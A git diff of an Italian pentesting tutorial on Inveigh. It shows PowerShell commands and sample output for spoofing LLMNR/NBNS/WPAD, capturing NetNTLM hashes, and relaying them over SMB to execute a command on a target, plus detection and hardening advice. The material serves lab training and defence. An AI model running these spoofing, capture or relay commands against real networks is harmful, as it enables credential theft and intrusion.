@@ -1,16 +1,11 @@
 ---
-title: >-
-  Inveigh: Attacchi Hacker su Reti Windows per Rubare Hash NTLM via LLMNR, NBNS
-  e WPAD
+title: 'Inveigh: LLMNR, NBNS e WPAD per Catturare Hash NTLM'
 slug: inveigh
-description: >-
-  Inveigh è uno strumento PowerShell che consente di eseguire attacchi LLMNR,
-  NBNS e WPAD direttamente su macchine Windows. Scopri come un attaccante può
-  intercettare credenziali e rubare hash NTLM in modo silenzioso e mirato.
-  Ideale per red team e test interni.
+description: 'Cos''è Inveigh e come funziona? Guida a LLMNR, NBNS e WPAD per catturare NetNTLM in lab Windows, con PowerShell, relay, troubleshooting e detection.'
 image: /INVEIGH.webp
 draft: false
 date: 2026-01-22T00:00:00.000Z
+lastmod: 2026-09-14T00:00:00.000Z
 categories:
   - tools
 subcategories:
@@ -20,64 +15,30 @@ tags:
   - ''
 ---
 
-# Inveigh: Attacchi Hacker su Reti Windows per Rubare Hash NTLM via LLMNR, NBNS e WPAD
+# Inveigh: LLMNR, NBNS e WPAD per Catturare NetNTLM
 
-Se in un lab AD vedi name resolution “sporco” (LLMNR/NBNS/WPAD) e vuoi catturare autenticazioni NTLM in modo riproducibile, Inveigh ti dà un setup rapido direttamente da Windows.
+Inveigh è uno strumento machine-in-the-middle pensato per pentester che si trovano già su un host Windows (post-exploitation) e vogliono sfruttare il traffico di name resolution locale — LLMNR, NBNS, WPAD — per indurre autenticazioni NTLM verso di sé e catturarle.
 
-## Intro
+Il progetto esiste in due rami: la versione **PowerShell (1.506)**, oggi considerata legacy e non più aggiornata, e la versione **C#/.NET (InveighZero)**, che è il ramo principale attuale e copre più protocolli e listener. Gli esempi di questa guida usano la sintassi PowerShell, la più diffusa nei walkthrough, ma verifica sempre quale versione hai a disposizione nel tuo lab prima di affidarti a un parametro specifico.
 
-Inveigh è un tool MITM (per pentester) che combina spoofing di name resolution e listener mirati per catturare credenziali/handshake (es. NetNTLM) su reti Windows.
+Tutto quello che segue va usato solo su lab, CTF, HTB/PG o ambienti per cui hai autorizzazione esplicita: anche solo "ascoltare" e rispondere su questi protocolli può avere effetti su utenti e servizi reali.
 
-In lab torna utile quando sei già dentro (post-exploitation) e vuoi trasformare “rumore di rete” in credenziali catturabili, senza dover per forza spostarti su Kali.
+## Cos'è Inveigh e come funziona
 
-Cosa farai:
+Inveigh intercetta richieste LLMNR/NBNS (e spesso WPAD) e vi risponde fingendosi la risorsa cercata, inducendo il client a tentare un'autenticazione NTLM verso il tuo host — autenticazione che puoi catturare e, in alcuni casi, tentare di rilanciare (relay) su un altro sistema. È l'equivalente "Windows-side" di [Responder](https://hackita.it/articoli/responder/), utile quando sei già dentro una rete via un foothold Windows e non vuoi (o non puoi) spostarti su Kali.
 
-* avvio “safe” e sanity check
-* 3 pattern operativi (capture, stealth, inspect-only)
-* cattura NetNTLM via HTTP/SMB + WPAD
-* troubleshooting tipico (permessi/porte/firewall)
-* detection e hardening (cosa deve fare il blue team)
+Quello che ottieni tipicamente non è un "hash NTLM" in senso stretto, ma un **NetNTLM challenge/response**: una struttura che lega uno username, un dominio e una risposta crittografica legata alla sfida inviata dal server — craccabile offline con la stessa logica di un hash, ma tecnicamente un oggetto diverso.
 
-Nota etica: tutto ciò che segue è pensato SOLO per lab/CTF/HTB/PG/VM personali o ambienti con autorizzazione esplicita.
+Segnali che in un lab vale la pena provarci: richieste LLMNR (UDP 5355) o NBNS (UDP 137) frequenti, tentativi automatici di risoluzione di `WPAD`, autenticazioni NTLM dove ti aspetteresti Kerberos.
 
-## Cos’è Inveigh e dove si incastra nel workflow
+## Installazione e prerequisiti
 
-> **In breve:** Inveigh intercetta richieste LLMNR/NBNS (e spesso WPAD) e le “risponde” per indurre autenticazioni NTLM verso di te, così da catturare NetNTLM e analizzare/validare il rischio in un lab.
-
-Inveigh è tipicamente un “tool da foothold Windows”: lo lanci su una macchina compromessa nel lab e lo usi come sensore/rogue service locale.
-
-Se stai già usando tool Linux-based in LAN (es. Responder), Inveigh è l’equivalente “Windows-side” e può essere più comodo quando non hai posizione di rete perfetta o vuoi ridurre il numero di hop. Per confronto operativo, vedi anche la guida su [Responder per LLMNR/NBT-NS/WPAD in LAN](https://hackita.it/articoli/responder/).
-
-Quando NON usarlo:
-
-* se non puoi garantire perimetro autorizzato (anche solo “ascoltare” e rispondere può impattare utenti/servizi)
-* se l’ambiente è fragile (account lockout, sistemi legacy, policy aggressive) e non hai una finestra di test controllata
-
-Segnali tipici che “vale la pena” in lab:
-
-* richieste LLMNR (UDP 5355) o NBNS (UDP 137) frequenti
-* tentativi automatici su `WPAD` (proxy auto-discovery)
-* autenticazioni NTLM presenti dove ti aspetteresti Kerberos “pulito”
-
-## Installazione, prerequisiti e quick sanity check
-
-> **In breve:** Puoi usare la versione PowerShell (legacy) o la versione .NET (C#). In entrambi i casi, aspettati che alcune funzioni richiedano privilegi elevati e che firewall/porte incidano molto sul risultato.
-
-### Pattern 1: versione PowerShell (comoda in post-exploitation)
-
-Perché: avvio rapido da PowerShell quando sei già su Windows.
-
-Cosa aspettarti: disponibilità dei comandi `Invoke-Inveigh`, `Get-InveighNTLM`, `Stop-Inveigh`.
-
-Comando:
+### Versione PowerShell (legacy, comoda in post-exploitation)
 
 ```powershell
-# Esempio lab: carica il modulo (path locale in cui hai copiato Inveigh)
 Import-Module .\Inveigh.psd1
 Get-Command -Module Inveigh
 ```
-
-Esempio di output (può variare):
 
 ```text
 CommandType Name              Version Source
@@ -87,57 +48,68 @@ Function    Stop-Inveigh       1.506   Inveigh
 Function    Get-InveighNTLM    1.506   Inveigh
 ```
 
-Interpretazione: se vedi i function export, il modulo è caricato correttamente.
-
-Errore comune + fix: `running scripts is disabled`. Imposta ExecutionPolicy SOLO nel contesto del lab/sessione.
+Se vedi questi comandi esportati, il modulo è caricato correttamente. Se PowerShell si rifiuta di eseguire lo script:
 
 ```powershell
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 ```
 
-### Pattern 2: versione .NET (C#) se vuoi portabilità e feature set più ampio
+Da usare solo nel contesto del lab — non come impostazione permanente.
 
-Perché: la versione C# è la “primary” e include più protocolli/listener.
-
-Cosa aspettarti: esecuzione via `dotnet` e console interattiva con contatori (capture counts).
-
-Comando:
+### Versione C#/.NET (InveighZero, ramo principale)
 
 ```powershell
-# Esempio lab: esegui Inveigh .NET
 dotnet .\Inveigh.dll
 ```
-
-Esempio di output (può variare):
 
 ```text
 Inveigh ...
 C(0:0) NTLMv1(0:0) NTLMv2(0:0)>
 ```
 
-Interpretazione: il prompt con contatori indica che il runtime è partito e sta tracciando catture.
+Il prompt con i contatori (cleartext:NTLMv1:NTLMv2) conferma che il runtime è partito. Se `dotnet` non è disponibile sul target, in lab porta un binario self-contained già compilato.
 
-Errore comune + fix: `dotnet: command not found` o runtime mancante. In lab, usa build self-contained o porta un binario già compilato per il target.
+Nota: alcune funzionalità, in particolare il packet sniffing "raw", richiedono privilegi elevati. Senza elevazione, preferisci i listener disponibili o la modalità inspect per osservare senza spoofare.
 
-Nota: alcune funzionalità (es. packet sniffing “raw”) possono richiedere elevazione; se non hai privilegi, preferisci listener/porte disponibili o la modalità “inspect” per osservare senza spoofare.
+## Inveigh Commands: i parametri principali
 
-## Sintassi base: 3 pattern che userai sempre
+| Parametro           | Funzione                                                              |
+| ------------------- | --------------------------------------------------------------------- |
+| `-Inspect`          | Osserva richieste LLMNR/NBNS senza attivare spoofing                  |
+| `-ConsoleOutput`    | Abilita output a console                                              |
+| `-FileOutput`       | Salva l'output su file                                                |
+| `-OutputDir`        | Directory di output                                                   |
+| `-NBNS`             | Abilita/disabilita lo spoofing NBNS                                   |
+| `-WPADAuth`         | Configura il tipo di autenticazione richiesta su WPAD                 |
+| `-SpooferRepeat`    | Abilita/disabilita la ripetizione delle risposte di spoofing          |
+| `-OutputStreamOnly` | Forza l'output sullo stream standard, utile su shell remote instabili |
 
-> **In breve:** Inveigh diventa efficace quando riduci rumore e controlli output: (1) default capture, (2) stealth mirato, (3) inspect-only per capire se vale la pena.
+## Inspect mode: osservare prima di agire
 
-### Pattern A — avvio “default capture” (rapido, ma più rumoroso)
+Prima di attivare qualunque spoofing, conviene sempre capire se il lab genera davvero traffico LLMNR/NBNS/WPAD:
 
-Perché: partire subito a catturare su HTTP/SMB e spoofare LLMNR (eventualmente NBNS).
+```powershell
+Invoke-Inveigh -Inspect -ConsoleOutput Y
+```
 
-Cosa aspettarti: console output con richieste intercettate e NetNTLM catturati; file di output se abiliti logging.
+```text
+[LLMNR] Request for FILESRV01 from 10.10.10.23
+[NBNS]  Query for WPAD from 10.10.10.45
+```
 
-Comando:
+Richieste ricorrenti per nomi non risolti indicano che una sessione di capture ha senso. È solo osservazione, non cattura: quando confermi il pattern, riavvia senza `-Inspect`.
+
+Se non vedi nulla dopo un paio di minuti, il problema è quasi sempre l'assenza di traffico reale nel lab (o la subnet sbagliata), non uno strumento "rotto" — puoi validare lato rete anche con [TShark](https://hackita.it/articoli/tshark/) da una macchina Linux di supporto, se disponibile.
+
+## LLMNR e NBNS: cattura di base
+
+### Avvio "default capture" (rapido, ma più rumoroso)
+
+Parte subito a catturare su HTTP/SMB e spoofare LLMNR (NBNS escluso di default in questo esempio, per ridurre il raggio d'azione):
 
 ```powershell
 Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp
 ```
-
-Esempio di output (può variare):
 
 ```text
 [*] Inveigh started
@@ -147,23 +119,15 @@ Esempio di output (può variare):
 [*] SMB Capture [ON]
 ```
 
-Interpretazione: stai spoofando LLMNR e ascoltando/catturando su HTTP/SMB; NBNS qui è off per ridurre “blast radius”.
+Se dopo qualche minuto non hai catture, verifica che nel lab esistano davvero richieste LLMNR/NBNS e che il firewall locale non blocchi il traffico in ingresso su porta/servizio.
 
-Errore comune + fix: nessuna cattura dopo minuti. Verifica che nel lab esistano richieste LLMNR/NBNS e che firewall locale non blocchi traffico in ingresso (porta/servizio).
+### Stealth mirato (riduci il rumore generato)
 
-### Pattern B — “stealth mirato” (riduci surface e lockout risk)
-
-Perché: limitare host/target e minimizzare replay/risposte ripetute.
-
-Cosa aspettarti: meno eventi, ma più “puliti” e correlabili.
-
-Comando:
+Utile quando vuoi meno eventi ma più puliti e correlabili, invece di partire con tutto acceso:
 
 ```powershell
 Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -SpooferRepeat N -WPADAuth Anonymous -NBNS N
 ```
-
-Esempio di output (può variare):
 
 ```text
 [*] SpooferRepeat [OFF]
@@ -171,109 +135,48 @@ Esempio di output (può variare):
 [*] NBNS Spoofer [OFF]
 ```
 
-Interpretazione: disabiliti repeat (meno spam verso la stessa vittima) e imposti WPAD in modo da ridurre prompt fastidiosi (dipende dal client).
+`-SpooferRepeat N` riduce le risposte ripetute verso lo stesso host — non è una vera protezione contro l'account lockout, che dipende da policy di dominio e comportamento del client, non dalla frequenza dello spoofing. `WPADAuth Anonymous` può ridurre prompt fastidiosi lato client, ma il comportamento varia da ambiente ad ambiente: se non vedi nulla, prova a tornare su `WPADAuth NTLM` e confronta i risultati.
 
-Errore comune + fix: pensare che “Anonymous” = cattura migliore. In alcuni client può ridurre prompt ma anche cambiare il comportamento; se non vedi nulla, torna a `WPADAuth NTLM` in lab e misura.
+## WPAD e cattura NetNTLM
 
-### Pattern C — “inspect-only” (prima osservi, poi decidi)
-
-Perché: capire se il lab genera richieste LLMNR/NBNS prima di attivare spoofing/capture aggressivo.
-
-Cosa aspettarti: log di richieste di name resolution senza attivare listener/catture principali.
-
-Comando:
-
-```powershell
-Invoke-Inveigh -Inspect -ConsoleOutput Y
-```
-
-Esempio di output (può variare):
-
-```text
-[LLMNR] Request for FILESRV01 from 10.10.10.23
-[NBNS]  Query for WPAD from 10.10.10.45
-```
-
-Interpretazione: se vedi richieste ricorrenti per nomi non risolti, hai “carburante” per una sessione di capture controllata.
-
-Errore comune + fix: scambiare “inspect” per cattura. È solo osservazione; quando confermi il pattern, riavvia senza `-Inspect`.
-
-## Cattura NetNTLM: LLMNR/NBNS + HTTP/SMB (cosa raccogli e come lo estrai)
-
-> **In breve:** L’obiettivo pratico è catturare handshake NTLM (NetNTLMv1/v2) associati a username/host. Inveigh ti permette di leggere i capture in memoria e/o su file.
-
-### Cattura e lettura hash in memoria
-
-Perché: estrarre rapidamente hash catturati senza rovistare file.
-
-Cosa aspettarti: liste in output (NTLMv1/NTLMv2) in formato “challenge/response” utile per analisi/validazione in lab.
-
-Comando:
-
-```powershell
-Get-InveighNTLM
-```
-
-Esempio di output (può variare):
-
-```text
-CORP\mrossi::CORP:1122334455667788:2F0A5BD1E1F0...:0101000000000000...
-CORP\SRV01$::CORP:9A8B7C6D5E4F3210:AA11BB22CC33...:0101000000000000...
-```
-
-Interpretazione: `utente::dominio:challenge:response:blob` è tipico di NetNTLMv2; gli account macchina finiscono con `$`.
-
-Errore comune + fix: vedere “troppi” account macchina. Se vuoi concentrarti su utenti, disabilita la visualizzazione degli account macchina (in base alla versione/parametri disponibili) o filtra output in post.
-
-### WPAD: perché spesso “cade” roba interessante
-
-Perché: WPAD è un vettore automatico che può generare autenticazioni NTLM “senza click”.
-
-Cosa aspettarti: richieste verso `wpad.dat` e tentativi di autenticazione su listener HTTP.
-
-Comando:
+WPAD (Web Proxy Auto-Discovery) può generare tentativi di autenticazione NTLM in certi ambienti — non come regola universale, dipende da configurazione di client e rete:
 
 ```powershell
 Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -WPADAuth NTLM
 ```
-
-Esempio di output (può variare):
 
 ```text
 [HTTP] WPAD request from 10.10.10.45 for /wpad.dat
 [HTTP] NTLMv2 captured for CORP\svc_proxy
 ```
 
-Interpretazione: se un servizio/utente cerca WPAD, puoi ottenere NetNTLM collegati ad account spesso “utili” in lab.
+Se non vedi richieste WPAD, in molti ambienti moderni è semplicemente disabilitato: non forzarlo, torna su LLMNR/NBNS e valida con `-Inspect`.
 
-Errore comune + fix: “nessuna richiesta WPAD”. In molti lab moderni WPAD è disabilitato o non usato; non forzare. Torna su LLMNR/NBNS classici e valida con `-Inspect`.
+Se abiliti HTTPS nella versione PowerShell, verrà installato un certificato nel certificate store locale: pianifica sempre il cleanup a fine test.
 
-Nota: se abiliti HTTPS nella versione PowerShell, può installare un certificato e legarlo alla 443; in lab, pianifica cleanup (cert store + netsh) se lo testi.
-
-## Relay “da lab”: prerequisiti, validazione e rischi
-
-> **In breve:** Il relay NTLM funziona solo se il target lo consente (es. signing non richiesto) e se l’account catturato ha privilegi sul target. In lab lo scopo è dimostrare l’impatto, non “fare rumore”.
-
-Inveigh (PowerShell) supporta opzioni di relay SMB, ma richiede caricare anche lo script dedicato e impostare un target/command.
-
-Prima di qualsiasi relay in lab, valida la superficie AD e i permessi: mappe e percorsi di escalation sono più chiari se li visualizzi con [BloodHound per Active Directory](https://hackita.it/articoli/bloodhound/) e poi verifichi accessi reali.
-
-### Esempio relay controllato (PowerShell) verso un target di lab
-
-Perché: dimostrare in modo riproducibile che un NetNTLM catturato può “spostarsi” su un altro host se le difese sono deboli.
-
-Cosa aspettarti: tentativo di esecuzione sul target indicato, con output di successo/fallimento.
-
-Comando:
+## Analizzare i NetNTLM catturati
 
 ```powershell
-# Prerequisito: Inveigh-Relay.ps1 caricato in memoria nel lab
-. .\Inveigh-Relay.ps1
-
-Invoke-Inveigh -SMBRelay Y -SMBRelayTarget 10.10.10.20 -SMBRelayCommand "whoami"
+Get-InveighNTLM
 ```
 
-Esempio di output (può variare):
+```text
+CORP\mrossi::CORP:1122334455667788:2F0A5BD1E1F0...:0101000000000000...
+CORP\SRV01$::CORP:9A8B7C6D5E4F3210:AA11BB22CC33...:0101000000000000...
+```
+
+Il formato `utente::dominio:challenge:response:blob` è tipico di NetNTLMv2; gli account macchina terminano con `$` e spesso dominano l'output, dato che molti servizi Windows autenticano in automatico.
+
+## NTLM Relay: prerequisiti e validazione in lab
+
+Il supporto al relay è una funzionalità della versione PowerShell/legacy, distinta dal ramo C#/.NET. Funziona solo se il target non richiede SMB signing e se l'account catturato ha privilegi sufficienti sul target — in lab lo scopo è dimostrare l'impatto (o l'efficacia delle mitigazioni), non generare rumore.
+
+Prima di qualunque relay, vale la pena mappare la superficie AD con [BloodHound](https://hackita.it/articoli/bloodhound/) per capire quali account e percorsi hanno davvero senso da testare.
+
+```powershell
+. .\Inveigh-Relay.ps1
+Invoke-Inveigh -SMBRelay Y -SMBRelayTarget 10.10.10.20 -SMBRelayCommand "whoami"
+```
 
 ```text
 [*] SMBRelay [ON] Target [10.10.10.20]
@@ -281,207 +184,114 @@ Esempio di output (può variare):
 [+] Relay success, command executed
 ```
 
-Interpretazione: “success” in lab significa che il target ha accettato relay e l’account aveva privilegi sufficienti.
+Se il relay fallisce sempre, le cause più comuni sono SMB signing attivo, target non raggiungibile o privilegi insufficienti — in quel caso il test ha comunque dimostrato che le mitigazioni funzionano, che è un risultato valido da riportare.
 
-Errore comune + fix: relay fallisce sempre. Le cause più comuni sono SMB signing richiesto, target non raggiungibile o privilegi insufficienti. In quel caso, il valore del test è proprio dimostrare che le mitigazioni funzionano.
+## Inveigh vs Responder
 
-Detection + hardening (sempre):
+|                                 | Inveigh                       | Responder              |
+| ------------------------------- | ----------------------------- | ---------------------- |
+| Piattaforma                     | Windows (PowerShell o .NET)   | Linux                  |
+| LLMNR                           | Sì                            | Sì                     |
+| NBNS                            | Sì                            | Sì                     |
+| WPAD                            | Sì                            | Sì                     |
+| Eseguibile da PowerShell nativo | Sì                            | No                     |
+| Scenario tipico                 | Foothold Windows già ottenuto | Postazione Kali in LAN |
 
-* alert su traffico LLMNR/NBNS anomalo e risposte “rogue”
-* enforcement SMB signing dove possibile
-* disabilita LLMNR e NBNS via GPO dove applicabile
-* disabilita WPAD se non serve o blocca `wpad` name resolution
+Se sei già su un host Windows compromesso e non vuoi introdurre un secondo salto verso Kali, Inveigh è la scelta naturale; se lavori da una macchina Linux con buona posizione di rete, Responder resta il workflow più diretto.
 
-## Errori comuni e troubleshooting (quelli che ti fanno perdere tempo)
+## Troubleshooting
 
-> **In breve:** Se Inveigh “non prende niente”, quasi sempre è (1) niente richieste in rete, (2) firewall/porte, (3) privilegi insufficienti, (4) output non visibile.
+**Nessun evento catturato.** Verifica prima con `-Inspect -RunTime 2` se nel lab passa davvero traffico LLMNR/NBNS/WPAD — senza richieste reali, nessuno strumento produrrà risultati.
 
-### Problema: nessun evento / nessuna cattura
-
-Perché: senza richieste LLMNR/NBNS/WPAD non succede nulla.
-
-Cosa aspettarti: `-Inspect` mostra zero richieste.
-
-Comando:
-
-```powershell
-Invoke-Inveigh -Inspect -ConsoleOutput Y -RunTime 2
-```
-
-Esempio di output (può variare):
-
-```text
-[*] Inspect mode enabled
-[*] No LLMNR/NBNS traffic observed
-```
-
-Interpretazione: nel tuo lab non sta passando il traffico che ti serve (o sei nella VLAN sbagliata).
-
-Errore comune + fix: “Inveigh rotto”. Prima prova in una subnet dove sai che esistono host Windows che generano richieste, oppure valida lato rete con cattura su una macchina di supporto (vedi [TShark per sniffing da terminale](https://hackita.it/articoli/tshark/) se sei su Linux in lab).
-
-### Problema: console “freeza” / output non torna in shell remota
-
-Perché: alcune sessioni remote gestiscono male stream diversi (warning, verbose, ecc.).
-
-Cosa aspettarti: comando parte ma non vedi output live.
-
-Comando:
+**Console che sembra bloccata o output non visibile in shell remota.** Alcune sessioni remote gestiscono male stream diversi; forza l'output standard:
 
 ```powershell
 Invoke-Inveigh -ConsoleOutput Y -OutputStreamOnly Y
 ```
 
-Esempio di output (può variare):
+Se hai comunque abilitato `-FileOutput Y`, controlla il file nella `-OutputDir` indicata.
 
-```text
-[*] OutputStreamOnly [ON]
-[*] ConsoleOutput [ON]
-```
-
-Interpretazione: forzi output sullo stream standard, spesso più compatibile con shell “fragili”.
-
-Errore comune + fix: pensare che non stia andando. Controlla i file se hai `-FileOutput Y` e un `-OutputDir` scrivibile.
-
-### Problema: porte/servizi in conflitto o firewall locale
-
-Perché: HTTP/HTTPS listener e SMB capture dipendono da binding/porte e regole firewall.
-
-Cosa aspettarti: warning o assenza completa di eventi su HTTP/SMB.
-
-Comando:
+**Porte o servizi in conflitto.** Verifica cosa sta già ascoltando prima di dare per scontato che Inveigh non funzioni:
 
 ```powershell
-# Quick visibility: dove stai ascoltando?
 netstat -ano | findstr ":80"
 netstat -ano | findstr ":445"
 ```
 
-Esempio di output (può variare):
+Un PID `4` (System) su quelle porte indica servizi Windows nativi già in ascolto — a seconda della versione e modalità, Inveigh può comunque catturare senza dover "rubare" la porta.
 
-```text
-TCP    0.0.0.0:80     0.0.0.0:0     LISTENING     4
-TCP    0.0.0.0:445    0.0.0.0:0     LISTENING     4
-```
+## Detection e hardening
 
-Interpretazione: PID 4 = System (servizi Windows). Inveigh può catturare anche senza “rubare” la 445 (dipende da modalità/versione), ma se ti serve un listener specifico, pianifica.
+**Detection:**
 
-Errore comune + fix: aprire tutto “a caso”. In lab, autorizza solo ciò che serve e misura. Se il lab blocca inbound, Inveigh vedrà poco anche se funziona.
+* Picchi di traffico LLMNR (UDP 5355) o NBNS (UDP 137) con risposte provenienti da host non attesi
+* Richieste ripetute verso `wpad.dat` indirizzate a un host comparso di recente sulla rete
+* Correlazione tra il nome richiesto (es. `FILESRV01`) e una risposta arrivata da una workstation qualunque
+* Hunting su PowerShell per stringhe/comandi tipici di tool MITM — con attenzione ai falsi positivi in lab
 
-## Alternative e tool correlati (quando preferirli)
+**Hardening:**
 
-> **In breve:** Inveigh è ideale da Windows. Se sei su Kali in LAN, spesso Responder + tool di relay dedicati è più flessibile. Se vuoi capire davvero cosa passa in rete, sniff prima, attacca poi.
+* Disabilitare LLMNR via GPO dove possibile
+* Limitare o filtrare NBNS (UDP 137)
+* Disabilitare WPAD se non è in uso, o controllarne rigorosamente la risoluzione
+* Enforcement di SMB signing, per rendere inefficace il relay anche se una cattura riesce
+* Ridurre la dipendenza da NTLM dove possibile, a favore di Kerberos
 
-Alternative pratiche:
+Prima di arrivare al relay, un giro di enumerazione con [smbclient](https://hackita.it/articoli/smbclient/) o [Enum4linux-ng](https://hackita.it/articoli/enum4linux-ng/) aiuta a capire cosa vale davvero la pena testare.
 
-* Responder: più immediato da Kali e workflow “LAN offensive” classico. Vedi [Responder per LLMNR/NBT-NS/WPAD](https://hackita.it/articoli/responder/).
-* Bettercap: utile in lab quando vuoi MITM/sniffing/spoofing più “general-purpose”. Vedi [Bettercap per MITM e spoofing](https://hackita.it/articoli/bettercap/).
-* Wireshark/TShark: per confermare richieste LLMNR/NBNS e capire timing e host “chiacchieroni”. Vedi [Wireshark per analisi traffico](https://hackita.it/articoli/wireshark/).
+## Scenario pratico su una macchina HTB/PG
 
-Quando preferire altro:
-
-* se l’obiettivo è enumerazione AD e non “credential capture”, parti da enum e pathing (es. LDAP/RPC/SMB). In lab puoi integrare con [rpcclient per enum SMB/AD](https://hackita.it/articoli/rpcclient/).
-* se vuoi solo validare reachability e flussi senza tool “attivi”, fai sniff passivo.
-
-## Hardening & detection (cosa deve vedere e bloccare il blue team)
-
-> **In breve:** LLMNR/NBNS/WPAD sono superfici “legacy” e spesso disattivabili. Se non puoi disattivarle, devi monitorare e rendere inutile il relay (signing, policy, segmentazione).
-
-Hardening consigliato (alta resa in lab):
-
-* disabilita LLMNR via GPO dove possibile
-* limita/filtra NBNS (UDP 137) e blocca name resolution non necessaria
-* disabilita WPAD se non serve; in alternativa, controlla rigorosamente come viene risolto `wpad`
-* enforcement SMB signing per impedire relay dove applicabile
-* riduci NTLM dove possibile (policy, auditing, migrazione verso Kerberos)
-
-Detection “operativa”:
-
-* spike di traffico LLMNR (UDP 5355) e NBNS (UDP 137) con risposte da host non attesi
-* pattern ricorrenti di richieste `wpad.dat` verso un host “nuovo”
-* correlazione tra nome richiesto (es. `FILESRV01`) e risposte da una workstation “random”
-* hunting specifico su PowerShell: comandi e stringhe tipiche di moduli MITM/relay (attenzione ai falsi positivi in lab)
-
-Se vuoi arricchire la parte “enum prima del capture”, usa strumenti di enumerazione SMB e share prima di qualsiasi relay, ad esempio [smbclient per accesso/attacco share](https://hackita.it/articoli/smbclient/) e [Enum4linux-ng per enumerazione Windows](https://hackita.it/articoli/enum4linux-ng/).
-
-## Scenario pratico: inveigh su una macchina HTB/PG
-
-> **In breve:** In un lab AD con un foothold Windows, lanci Inveigh per osservare (inspect), poi abiliti capture mirato e infine estrai NetNTLM per dimostrare l’impatto e scrivere mitigazioni.
-
-Ambiente:
-
-* Attacker foothold Windows: `10.10.10.10` (host compromesso nel lab)
-* Subnet lab: `10.10.10.0/24`
-* Obiettivo: catturare almeno 1 NetNTLMv2 da traffico LLMNR/WPAD e documentare detection/hardening
-
-Azione 1 (inspect):
+Ambiente: foothold Windows su `10.10.10.10`, subnet lab `10.10.10.0/24`. Obiettivo: catturare almeno un NetNTLMv2 e documentare detection/hardening.
 
 ```powershell
 Import-Module .\Inveigh.psd1
 Invoke-Inveigh -Inspect -ConsoleOutput Y -RunTime 2
 ```
 
-Azione 2 (capture controllato):
-
 ```powershell
 Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp -SpooferRepeat N -NBNS N
 ```
-
-Azione 3 (estrazione hash):
 
 ```powershell
 Get-InveighNTLM
 ```
 
-Risultato atteso concreto:
+Risultato atteso: almeno una riga NetNTLMv2 (utente o account macchina) e, se `-FileOutput Y` è attivo, un log salvato in `C:\Windows\Temp`. Nel report vale la pena includere sempre: sorgente della richiesta, nome richiesto, tipo di risposta rogue, account catturato, e le mitigazioni verificate (o mancanti) — disabilitazione LLMNR/NBNS/WPAD, stato di SMB signing.
 
-* output con almeno una riga NetNTLMv2 (utente o account macchina)
-* file di log/capture in `C:\Windows\Temp` (se `-FileOutput Y`)
-
-Detection + hardening (in 2–4 frasi):
-
-* in lab, registra LLMNR/NBNS e identifica chi risponde alle richieste (rogue responder)
-* disabilita LLMNR/NBNS e riduci WPAD dove non serve
-* enforcement SMB signing riduce drasticamente l’impatto del relay
-* alert su richieste `wpad.dat` e risposte da host non autorizzati
-
-## Playbook 10 minuti: inveigh in un lab
+## Playbook 10 minuti: Inveigh in un lab
 
 ### Step 1 – Conferma che il lab genera LLMNR/NBNS/WPAD
 
-Avvia `-Inspect` per 2 minuti: se non vedi richieste, cambiare tool non aiuta.
+Avvia `-Inspect` per 2 minuti: se non vedi richieste, cambiare strumento non aiuta.
 
 ```powershell
 Invoke-Inveigh -Inspect -ConsoleOutput Y -RunTime 2
 ```
 
-### Step 2 – Carica modulo e prepara output directory
+### Step 2 – Carica il modulo e prepara la directory di output
 
-Usa una cartella scrivibile e non “strana” per evitare errori di permessi.
+Usa una cartella scrivibile e non insolita, per evitare errori di permessi.
 
 ```powershell
 Import-Module .\Inveigh.psd1
 New-Item -ItemType Directory -Path C:\Windows\Temp\inv -Force | Out-Null
 ```
 
-### Step 3 – Avvia capture con rumore ridotto
+### Step 3 – Avvia la cattura con rumore ridotto
 
-Disabilita repeat e NBNS finché non serve davvero.
+Disabilita repeat e NBNS finché non hai un motivo specifico per riattivarli.
 
 ```powershell
 Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp\inv -SpooferRepeat N -NBNS N
 ```
 
-### Step 4 – Osserva per 3–5 minuti e annota sorgenti “chiacchierone”
+### Step 4 – Osserva per 3-5 minuti e annota le sorgenti più "chiacchierone"
 
-Segna IP/host che fanno richieste ripetute: sono spesso i migliori candidati per test controllati.
+Gli host che generano richieste ripetute sono spesso i migliori candidati per un test controllato successivo.
 
-```powershell
-# (niente comando obbligatorio) osserva output live e prendi note
-```
+### Step 5 – Estrai i NetNTLM catturati e salva le evidenze
 
-### Step 5 – Estrai NetNTLM in memoria e salva evidenze
-
-Lo scopo è reportabile: cattura + contesto + mitigazioni.
+Lo scopo è essere reportabile: cattura più contesto più mitigazioni verificate.
 
 ```powershell
 Get-InveighNTLM | Out-File C:\Windows\Temp\inv\netntlm.txt -Encoding ascii
@@ -489,105 +299,94 @@ Get-InveighNTLM | Out-File C:\Windows\Temp\inv\netntlm.txt -Encoding ascii
 
 ### Step 6 – Se serve, abilita WPAD in modo misurato
 
-Non partire da WPAD se non hai visto richieste; abilitalo solo per validare un vettore nel lab.
+Non partire da WPAD se `-Inspect` non ha mostrato richieste: abilitalo solo per validare quel vettore specifico.
 
 ```powershell
 Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp\inv -WPADAuth NTLM
 ```
 
-### Step 7 – Stop pulito e cleanup
+### Step 7 – Stop pulito
 
-Fermati e lascia il sistema in condizioni “pulite” per non inquinare test successivi.
+Fermati e lascia il sistema in condizioni pulite, per non inquinare i test successivi.
 
 ```powershell
 Stop-Inveigh
 ```
 
-## Checklist operativa
-
-* Verifica che il test sia autorizzato (lab/CTF/VM) e che il perimetro sia chiaro.
-* Prima osserva con `-Inspect`, poi abilita spoof/capture.
-* Usa `-SpooferRepeat N` per ridurre spam e rischio lockout.
-* Tieni `-NBNS N` finché non hai un motivo specifico per abilitarlo.
-* Abilita `-FileOutput Y` e imposta `-OutputDir` in una path scrivibile.
-* Se la shell è instabile, usa `-OutputStreamOnly Y`.
-* Se non catturi nulla, verifica traffico reale (LLMNR/NBNS/WPAD) e firewall locale.
-* Non usare HTTPS a caso: valuta certificati e cleanup in lab.
-* Documenta sempre: sorgente richiesta, nome richiesto, risposta rogue, account catturato, impatto.
-* Inserisci detection e hardening nel report (disabilitare LLMNR/NBNS/WPAD, SMB signing, auditing).
-* Se testi relay, fallo solo su target di lab e misura perché fallisce (mitigazioni efficaci).
